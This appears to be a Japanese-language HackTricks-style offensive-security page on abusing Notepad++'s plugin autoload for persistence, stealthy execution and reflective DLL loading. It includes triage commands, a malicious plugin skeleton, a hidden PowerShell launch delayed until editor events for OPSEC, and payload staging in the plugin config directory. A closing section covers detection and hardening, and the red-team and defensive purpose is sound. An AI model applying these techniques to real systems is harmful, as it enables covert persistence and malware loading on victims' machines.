# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++は起動時に、`plugins`サブフォルダー内にあるすべてのプラグインDLLを**自動ロード**します。書き込み可能なNotepad++のインストール先に悪意のあるプラグインを配置すると、エディターの起動時に毎回`notepad++.exe`内でコードが実行されます。これは**persistence**、ステルス性の高い**initial execution**、またはエディターを昇格した状態で起動した場合の**in-process loader**として悪用できます。<sup>[[1]](#references)</sup>

**Notepad++ 7.6以降**では、手動インストール時の想定レイアウトはプラグインごとに1つのサブフォルダー（`plugins\<PluginName>\<PluginName>.dll`）です。**portable mode**（`notepad++.exe`と同じ場所に`doLocalConf.xml`がある場合）では、アプリケーションツリー全体がそのディレクトリ内に維持されます。そのため、コピーされた管理者用ツールのバンドルが、ユーザーによる書き込みが可能な実行場所になっていることがよくあります。<sup>[[2]](#references)</sup>

## 書き込み可能なプラグインの場所

- 標準インストール先：`C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll`（通常、書き込みには管理者権限が必要です）。<sup>[[1]](#references)</sup>
- 低権限ユーザーが利用できる書き込み可能な選択肢：<sup>[[1]](#references)</sup>
  - ユーザーが書き込み可能なフォルダーで**portable Notepad++ build**を使う。
  - `C:\Program Files\Notepad++`をユーザーが管理するパス（例：`%LOCALAPPDATA%\npp\`）にコピーし、そこから`notepad++.exe`を実行する。
  - `doLocalConf.xml`がすでに含まれており、`Program Files`の外に置かれた**管理者用ツールのバンドル**、展開済みのzipコピー、またはヘルプデスクのツールキットを探す。
- 各プラグインは`plugins`内の専用サブフォルダーに置かれ、起動時に自動ロードされます。メニュー項目は**Plugins**の下に表示されます。<sup>[[2]](#references)</sup>

簡易トリアージ：

```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```

## Plugin のロードポイント（実行プリミティブ）
Notepad++ は特定の **エクスポート関数**を想定しています。これらはすべて初期化中に呼び出されるため、複数の実行ポイントがあります:<sup>[[1]](#references)</sup>
- **`DllMain`** — DLL のロード直後に実行されます（最初の実行ポイント）。
- **`setInfo(NppData)`** — Notepad++ のハンドルを渡すため、ロード時に一度呼び出されます。通常はメニュー項目を登録する場所です。
- **`getName()`** — メニューに表示される plugin 名を返します。
- **`getFuncsArray(int *nbF)`** — メニューコマンドを返します。空でも、起動時に呼び出されます。
- **`beNotified(SCNotification*)`** — Notepad++ / Scintilla のイベントを受け取ります（ユーザー操作またはエディターイベントまで payloads の実行を遅らせるのに便利です）。
- **`messageProc(UINT, WPARAM, LPARAM)`** — メッセージハンドラーで、大きなデータのやり取りに便利です。
- **`isUnicode()`** — ロード時に確認される互換性フラグです。

ほとんどのエクスポート関数は **スタブ**として実装できます。autoload 中に `DllMain` または上記のコールバックから実行できます。

## 最小限の悪意ある plugin のスケルトン
想定されるエクスポート関数を含む DLL をコンパイルし、書き込み可能な Notepad++ フォルダー内の `plugins\\MyNewPlugin\\MyNewPlugin.dll` に配置します:<sup>[[1]](#references)</sup>

```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```

1. DLLをビルドします（Visual Studio/MinGW）。
2. `plugins` の下にプラグイン用サブフォルダを作成し、その中にDLLを配置します。
3. Notepad++を再起動します。DLLが自動的に読み込まれ、`DllMain`と後続のコールバックが実行されます。

## `beNotified`を使った低ノイズのトリガーパターン
OPSECのため、多くのpayloadは`DllMain`から起動させるべきではありません。より目立たない方法は、プラグインを正常に読み込ませてから、**起動完了**、**バッファのアクティブ化**、**最初の文字入力**など、実際に起こりそうなエディターイベントの後にのみ実行することです。

```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
  if (fired) return;
  if (n->nmhdr.code == NPPN_READY ||
      n->nmhdr.code == NPPN_BUFFERACTIVATED ||
      n->nmhdr.code == SCN_CHARADDED) {
    fired = true;
    WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
  }
}
```

これは、ノイズの多い`DllMain` beaconよりも、公開されている攻撃的な研究に近い手法です。DLLは起動時にautoloadされますが、悪意ある動作はNotepad++が実際に使用されているように見えるまで遅延されます。

## plugin config directoryをセカンダリストレージとして使用する
Notepad++は`NPPM_GETPLUGINSCONFIGDIR`を公開しており、**現在のユーザーのplugin設定ディレクトリ**を返します。<sup>[[3]](#references)</sup> 悪意あるpluginはこの機能を使って、ディスク上のDLLを最小限に保ちながら、暗号化された設定、ステージング済みのpayload、またはtaskingファイルを、通常のplugin状態に紛れ込むパスに保存できます。

```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```

運用面では、次のような場合に有用です。
- 自動ロードされる小さな bootstrap DLL が必要な場合
- メインの plugin binary に再度触れることなく、ユーザーごとに tasking を行いたい場合
- **自動ロードのトリガー**と、より大きな第2ステージを分離したい場合

## Reflective loader plugin パターン
weaponized plugin によって、Notepad++ を**reflective DLL loader**にできます。<sup>[[1]](#references)</sup>
- 最小限の UI/menu entry（例: "LoadDLL"）を表示する。
- payload DLL を取得するための**file path**または**URL**を受け付ける。
- DLL を現在のプロセスに reflectively map し、export された entry point（例: 取得した DLL 内の loader function）を呼び出す。
- 利点: 新しい loader を spawn せず、無害そうな GUI process を再利用できる。payload は `notepad++.exe` の integrity（elevated context を含む）を引き継ぐ。
- トレードオフ: **unsigned plugin DLL**をディスクに配置すると目立つ。実用的な代替策は、自動ロードされる plugin を stub としてのみ使い、本物の implant は別の場所に暗号化してステージングしておくこと。

## 検知とハードニングに関する注意点
- Notepad++ の plugin directory（ユーザープロファイル内の portable copy を含む）への**書き込みをブロックまたは監視**する。controlled folder access または application allowlisting を有効にする。
- `plugins` 配下の**新しい unsigned DLL**、portable Notepad++ ツリーの変更、および `notepad++.exe` からの不審な**子プロセスやネットワークアクティビティ**にアラートを出す。
- 正規の plugin をベースライン化し、通常の Notepad++ plugin interface を export しながら、shell、PowerShell、または network beacon も起動する新しい DLL を調査する。
- plugin のインストールは **Plugins Admin** 経由に限定し、信頼できない path からの portable copy の実行を制限する。

## References

- [1] [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [2] [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [3] [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)
{{#include ../../banners/hacktricks-training.md}}
